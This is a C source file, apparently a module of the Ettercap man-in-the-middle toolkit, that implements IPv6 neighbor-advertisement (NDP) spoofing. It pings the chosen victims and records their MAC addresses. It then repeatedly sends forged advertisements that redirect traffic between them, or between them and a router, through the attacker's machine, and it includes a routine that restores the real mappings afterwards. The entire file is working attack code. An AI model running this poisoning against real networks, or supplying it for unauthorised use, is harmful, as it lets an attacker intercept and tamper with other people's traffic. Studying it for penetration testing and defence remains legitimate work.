/*
 *    ICMPv6 Neighbor Advertisement poisoning ec module.
 *    The basic idea is the same as for ARP poisoning
 *    but ARP cannot be used with IPv6. Lurk [1] for details.
 *
 *    [1] - http://packetlife.net/blog/2009/feb/2/ipv6-neighbor-spoofing/
 *
 *    the braindamaged entities collective
 */

#include <ec.h>
#include <ec_mitm.h>
#include <ec_threads.h>
#include <ec_send.h>
#include <ec_hook.h>

/* globals */
struct hosts_group nadv_group_one;
struct hosts_group nadv_group_two;

static LIST_HEAD(,ip_list) ping_list_one;
static LIST_HEAD(,ip_list) ping_list_two;

u_int8 flags;
#define ND_ONEWAY    ((u_int8)(1<<0))
#define ND_ROUTER    ((u_int8)(1<<2))

/* protos */
void nadv_poison_init(void);
static int nadv_poison_start(char *args);
static void nadv_poison_stop(void);
EC_THREAD_FUNC(nadv_poisoner);
static int create_list(void);
static int create_list_silent(void);
static void catch_response(struct packet_object *po);
static void nadv_antidote(void);
static void record_mac(struct packet_object *po);

/* c0d3 */

void __init nadv_poison_init(void)
{
   struct mitm_method mm;

   mm.name = "nadv";
   mm.start = &nadv_poison_start;
   mm.stop = &nadv_poison_stop;

   mitm_add(&mm);
}

static int nadv_poison_start(char *args)
{
   struct hosts_list *h, *tmp;
   int ret;
   char *p;

   DEBUG_MSG("nadv_poison_start");

   flags = 0;

   if(strcmp(args, "")) {
      for(p = strsep(&args, ","); p != NULL; p = strsep(&args, ",")) {
         if(!strcasecmp(p, "remote"))
            GBL_OPTIONS->remote = 1;
         else if(!strcasecmp(p, "oneway"))
            flags |= ND_ONEWAY;
         else if(!strcasecmp(p, "router"))
            flags |= ND_ROUTER;
         else
            SEMIFATAL_ERROR("NADV poisoning: incorrect arguments.\n");
      }
   } else {
      SEMIFATAL_ERROR("NADV poisoning: missing arguments.\n");
   }

   /* clean the lists */
   LIST_FOREACH_SAFE(h, &nadv_group_one, next, tmp) {
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }
   LIST_FOREACH_SAFE(h, &nadv_group_two, next, tmp) {
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }

   if(GBL_OPTIONS->silent) {
      create_list_silent();
      hook_add(HOOK_PACKET_ICMP6, &record_mac);
   } else {
      if((ret = create_list()) != ESUCCESS) {
         SEMIFATAL_ERROR("NADV poisoning failed to start");
         return EFATAL;
      }
      hook_add(HOOK_PACKET_ICMP6, &catch_response); 
   }

   ec_thread_new("nadv_poisoner", "NDP spoofing thread", &nadv_poisoner, NULL);

   USER_MSG("NADV poisoner activated.\n");

   return ESUCCESS;
}

static void nadv_poison_stop(void)
{
   pthread_t pid;

   DEBUG_MSG("nadv_poison_stop");
   
   hook_del(HOOK_PACKET_ICMP6, &catch_response);

   pid = ec_thread_getpid("nadv_poisoner");
   if(!pthread_equal(pid, EC_PTHREAD_NULL))
      ec_thread_destroy(pid);
   else {
      DEBUG_MSG("no poisoner thread found");
      return;
   }

   USER_MSG("NADV poisoner deactivated.\n");

   USER_MSG("Depoisoning the victims.\n");
   nadv_antidote();

   ui_msg_flush(2);

   return;
}

EC_THREAD_FUNC(nadv_poisoner)
{
   struct hosts_list *t1, *t2;
   int ping = 1;

   ec_thread_init();
   DEBUG_MSG("nadv_poisoner");

   /* it's a loop */
   LOOP {
      
      CANCELLATION_POINT();

      /* Here we go! */
      LIST_FOREACH(t1, &nadv_group_one, next) {
         LIST_FOREACH(t2, &nadv_group_two, next) {

            if(!ip_addr_cmp(&t1->ip, &t2->ip))
               continue;

            if(ping) {
               send_icmp6_echo(&t1->ip, &t2->ip);
               send_icmp6_echo(&t2->ip, &t1->ip);
            }

            send_icmp6_nadv(&t1->ip, &t2->ip, &t1->ip, GBL_IFACE->mac, 0);
            if(!(flags & ND_ONEWAY))
               send_icmp6_nadv(&t2->ip, &t1->ip, &t2->ip, GBL_IFACE->mac, flags & ND_ROUTER);

            usleep(GBL_CONF->nadv_poison_send_delay);
         }
      }

      ping = 0;

      sleep(1);
   }

   return NULL;
}

static int create_list(void)
{
   struct ip_list *i;
   struct ip_addr local;

   DEBUG_MSG("create_list");

   /*
    * We cannot use GBL_HOSTLIST here
    * IPv6 networks are obviously too huge to scan
    */

   LIST_FOREACH(i, &GBL_TARGET1->ip6, next) {
      if(!ip_addr_is_local(&i->ip, &local)) {
         LIST_INSERT_HEAD(&ping_list_one, i, next);
         send_icmp6_echo(&local, &i->ip);
      }
   }

   LIST_FOREACH(i, &GBL_TARGET2->ip6, next) {
      if(!ip_addr_is_local(&i->ip, &local)) {
         send_icmp6_echo(&local, &i->ip);
         LIST_INSERT_HEAD(&ping_list_two, i, next);
      }

   }

   return ESUCCESS;
}

static int create_list_silent(void)
{
   struct hosts_list *h;
   struct ip_list *i;

   DEBUG_MSG("create_silent_list");

   LIST_FOREACH(i, &GBL_TARGET1->ip6, next) {
      if(!ip_addr_is_local(&i->ip, NULL)) {
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &i->ip, sizeof(struct ip_addr));
         LIST_INSERT_HEAD(&nadv_group_one, h, next);
      }
   }

   LIST_FOREACH(i, &GBL_TARGET2->ip6, next) {
      if(!ip_addr_is_local(&i->ip, NULL)) {
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &i->ip, sizeof(struct ip_addr));
         LIST_INSERT_HEAD(&nadv_group_two, h, next);
      }
   }

   return ESUCCESS;
}

static void catch_response(struct packet_object *po)
{
   struct hosts_list *h;
   struct ip_list *i;

   /* if it is not response to our ping */
   if(ip_addr_is_ours(&po->L3.dst) != EFOUND)
      return; 

   /* 
    * search if the node address is in one of the ping lists
    * if so add the address to the poison list
    */
   LIST_FOREACH(i, &ping_list_one, next) {
      /* the source is in the ping hosts list */
      if(!ip_addr_cmp(&po->L3.src, &i->ip)) {
         LIST_REMOVE(i, next);
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &po->L3.src, sizeof(struct ip_addr));
         memcpy(&h->mac, &po->L2.src, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&nadv_group_one, h, next);
         break;
      }
   }

   LIST_FOREACH(i, &ping_list_two, next) {
      if(!ip_addr_cmp(&po->L3.src, &i->ip)) {
         LIST_REMOVE(i, next);
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &po->L3.src, sizeof(struct ip_addr));
         memcpy(&h->mac, &po->L2.src, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&nadv_group_two, h, next);
         break;
      }
   }

   return;
}

static void nadv_antidote(void)
{
   struct hosts_list *h1, *h2;
   int i;

   DEBUG_MSG("nadv_antidote");

   /* do it twice */
   for(i = 0; i < 2; i++) {
      LIST_FOREACH(h1, &nadv_group_one, next) {
         LIST_FOREACH(h2, &nadv_group_two, next) {
            if(!ip_addr_cmp(&h1->ip, &h2->ip))
               continue;

            send_icmp6_nadv(&h1->ip, &h2->ip, &h1->ip, h1->mac, 0);
            if(!(flags & ND_ONEWAY))
               send_icmp6_nadv(&h2->ip, &h1->ip, &h2->ip, h2->mac, flags & ND_ROUTER);

            usleep(GBL_CONF->nadv_poison_send_delay);
         }
      }

      sleep(1);
   }
}

static void record_mac(struct packet_object *po)
{
   struct ip_addr *ip;
   u_char *mac;
   struct hosts_list *h;

   if(ip_addr_is_ours(&po->L3.src)) {
      ip = &po->L3.dst;
      mac = po->L2.dst;
   } else if(ip_addr_is_ours(&po->L3.dst)) {
      ip = &po->L3.src;
      mac = po->L2.src;
   } else {
      return;
   }

   LIST_FOREACH(h, &nadv_group_one, next) {
      if(!ip_addr_cmp(&h->ip, ip)) {
         memcpy(&h->mac, mac, MEDIA_ADDR_LEN);
         return;
      }
   }

   LIST_FOREACH(h, &nadv_group_two, next) {
      if(!ip_addr_cmp(&h->ip, ip)) {
         memcpy(&h->mac, mac, MEDIA_ADDR_LEN);
         return;
      }
   }
}

